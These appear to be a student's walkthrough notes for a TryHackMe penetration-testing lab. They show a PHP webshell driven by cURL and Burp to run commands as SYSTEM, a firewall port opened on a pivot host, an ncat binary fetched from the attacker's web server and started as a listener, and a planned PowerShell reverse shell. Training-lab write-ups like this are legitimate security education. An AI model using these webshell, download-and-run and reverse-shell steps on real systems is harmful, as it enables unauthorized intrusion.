In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.

![[Exploitation-20241222141211867.webp]]

Success!

Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

From here we want to obtain a full reverse shell. We have two options for this:

1. We could change the command in the exploit and re-run the code
2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice

Option number two is a lot quieter than option number 1, so let's use that.

---

The webshell we have uploaded responds to a POST request using the parameter "`a`" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.

## With cURL  
`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`

![[Exploitation-20241222145319679.webp]]

> [!Note]
>In this screenshot,_`gitserver.thm` has been added to the `/etc/hosts` file on the attacking machine, mapped to the target IP address.


## With BurpSuite
We first turn on our Burp proxy (see the [Burpsuite room](https://tryhackme.com/room/rpburpsuite) if you need help with this!) and navigate to the exploit URL:

![[Exploitation-20241222145720411.webp]]

Press send, and see the response come in!

![[Exploitation-20241222145746536.webp]]

With two methods available, pick your favorite and we'll aim for a shell!


---
# Your job

- Create a webshell with cURL.
	`curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=whoami"`
	
	![[Exploitation-20241222152701712.webp]]
- Check the target for information.
	`curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=systeminfo"`
	 ![[Exploitation-20241222152545435.webp]]
- Create a Firewall rule.
	- Connect to the prod-server (10.200.84.200) via SSH.
		$ `ssh root@10.200.84.200 -i id_rsa`
	- Create a Firewall rule to allow connections through.
		root@prod-serv ~# `firewall-cmd --zone=public --add-port 23337/tcp`
	- Get **ncat** binary from attacker machine.
		- Download ncat from https://github.com/andrew-d/static-binaries.git.
			$ `git clone https://github.com/andrew-d/static-binaries.git`
		- Open a Python Webserver.
			$ `sudo python3 -m http.server 80`
		- On the Reverse Shell terminal run:
			root@prod-serv ~# `curl 10.50.85.33/ncat -o /tmp/ncat-sv && chmod +x /tmp/ncat-sv`
		- Open a listener on the Reverse Shell.
			root@prod-serv tmp# `./ncat-sv -nvlp 23337`

- On the attacking machine use powershell reverse-shell one-liner with webshell using curl.
- `curl -X POST http://10.200.84.150/web/exploit-KAIROS.php -d "a=<URL-encoded command>"`



- **Bonus Question (Optional):** Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.